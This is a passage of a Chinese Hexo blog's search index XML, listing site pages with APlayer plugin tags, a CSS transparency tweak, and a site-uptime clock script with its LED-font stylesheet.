            <tag> Markdown, VScode </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title></title>
      <link href="/css/custom.css"/>
      <url>/css/custom.css</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>/* 页脚与头图透明 */#footer {    background: transparent !important;  }  #page-header {    background: transparent !important;  }    /* 白天模式遮罩透明 */  #footer::before {    background: transparent !important;  }  #page-header::before {    background: transparent !important;  }    /* 夜间模式遮罩透明 */  [data-theme="dark"] #footer::before {    background: transparent !important;  }  [data-theme="dark"] #page-header::before {    background: transparent !important;  }]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>分类</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>关于</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/runtime.js"/>
      <url>/js/runtime.js</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>setInterval(() => {  let create_time = Math.round(new Date('2023-01-10 00:00:00').getTime() / 1000); //在此行修改建站时间  let timestamp = Math.round((new Date().getTime()) / 1000);  let second = timestamp - create_time;  let time = new Array(0, 0, 0, 0, 0);  var nol = function(h){    return h>9?h:'0'+h;  }  if (second >= 365 * 24 * 3600) {    time[0] = parseInt(second / (365 * 24 * 3600));    second %= 365 * 24 * 3600;  }  if (second >= 24 * 3600) {    time[1] = parseInt(second / (24 * 3600));    second %= 24 * 3600;  }  if (second >= 3600) {    time[2] = nol(parseInt(second / 3600));    second %= 3600;  }  if (second >= 60) {    time[3] = nol(parseInt(second / 60));    second %= 60;  }  if (second > 0) {    time[4] = nol(second);  }  if ((Number(time[2])<22) && (number(time[2])>7)){    currentTimeHtml ="<img class="boardsign" src="https://img.shields.io/badge/糖果屋-营业中-6adea8?style=social&logo=cakephp" title="距离百年老店也就差不到一百年~"><div id="runtime">" + time[0] + ' YEAR ' + time[1] + ' DAYS ' + time[2] + ' : ' + time[3] + ' : ' + time[4] + '</div>';  }  else{    currentTimeHtml ="<img class="boardsign" src="https://img.shields.io/badge/糖果屋-打烊了-6adea8?style=social&logo=coffeescript" title="这个点了应该去睡觉啦，熬夜对身体不好哦"><div id="runtime">" + time[0] + ' YEAR ' + time[1] + ' DAYS ' + time[2] + ' : ' + time[3] + ' : ' + time[4] + '</div>';  }  document.getElementById("workboard").innerHTML = currentTimeHtml;}, 1000);</22)>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>电影</title>
      <link href="/movies/index.html"/>
      <url>/movies/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>友链</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/css/runtime.css"/>
      <url>/css/runtime.css</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>/*电子钟字体*/@font-face {  font-family: 'UnidreamLED';  src: url("https://cdn.jsdelivr.net/npm/akilar-candyassets/fonts/UnidreamLED.ttf");  font-display: swap;}div#runtime {  width: 180px;  margin: auto;  color: #fff;  padding-inline: 5px;  border-radius: 10px;  background-color: rgba(0,0,0,0.7);  font-family: 'UnidreamLED';}[data-theme="dark"] div#runtime {  color: #28b4c8;  box-shadow: 0 0 5px rgba(28,69,218,0.71);  animation: flashlight 1s linear infinite alternate;}/*悬停显示徽标提示语*/a.github-badge:hover:before {  position: fixed;  width: fit-content;  margin: auto;  left: 0;  right: 0;  top: 10%;  border-radius: 10px;  text-align: center;  z-index: 100;  content: attr(data-title);  font-size: 20px;  color: #fff;  padding: 10px;  background-color: var(--text-bg-hover);}[data-theme=dark] a.github-badge:hover:before {  background-color: rgba(18,18,18,0.8);}@-moz-keyframes flashlight {  from {    box-shadow: 0 0 5px #1478d2;  }  to {    box-shadow: 0 0 2px #1478d2;  }}@-webkit-keyframes flashlight {  from {    box-shadow: 0 0 5px #1478d2;  }  to {    box-shadow: 0 0 2px #1478d2;  }}@-o-keyframes flashlight {  from {    box-shadow: 0 0 5px #1478d2;  }  to {    box-shadow: 0 0 2px #1478d2;  }}@keyframes flashlight {  from {    box-shadow: 0 0 5px #1478d2;  }  to {    box-shadow: 0 0 2px #1478d2;  }}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>音乐</title>
      <link href="/music/index.html"/>
      <url>/music/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
      
    </entry>
    
    
  
</search>
